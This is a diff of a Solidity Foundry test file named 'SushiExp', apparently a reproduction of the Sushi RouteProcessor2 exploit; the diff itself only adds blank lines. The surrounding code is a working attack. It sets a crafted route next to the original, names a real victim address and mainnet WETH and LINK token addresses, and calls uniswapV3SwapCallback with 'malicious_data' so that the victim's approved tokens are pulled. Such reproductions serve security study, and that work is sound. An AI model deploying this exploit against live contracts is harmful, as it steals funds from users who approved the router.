@@ -14,6 +14,7 @@ import "./../interface.sol";
 // Sushi RouteProcessor2 does not check user input `route` carefully.
 
 interface IUniswapV3Pool {
+
     function swap(
         address recipient,
         bool zeroForOne,
@@ -21,9 +22,11 @@ interface IUniswapV3Pool {
         uint160 sqrtPriceLimitX96,
         bytes calldata data
     ) external returns (int256 amount0, int256 amount1);
+
 }
 
 interface IRouteProcessor2 {
+
     function processRoute(
         address tokenIn,
         uint256 amountIn,
@@ -36,11 +39,13 @@ interface IRouteProcessor2 {
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
 
     function tridentCLSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
+
 }
 //original route 0x01514910771af9ca656af840dff83e8264ecf986ca01000001f9a001d5b2c7c5e45693b41fcf931b94e680cac4000000000000000000000000000000000000000000
 // my route      0x01514910771af9ca656af840dff83e8264ecf986ca010000017fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000
 
 contract SushiExp is Test, IUniswapV3Pool {
+
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
     address victim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
@@ -90,4 +95,5 @@ contract SushiExp is Test, IUniswapV3Pool {
         bytes memory malicious_data = abi.encode(address(WETH), victim);
         processor.uniswapV3SwapCallback(100 * 10 ** 18, 0, malicious_data);
     }
+
 }
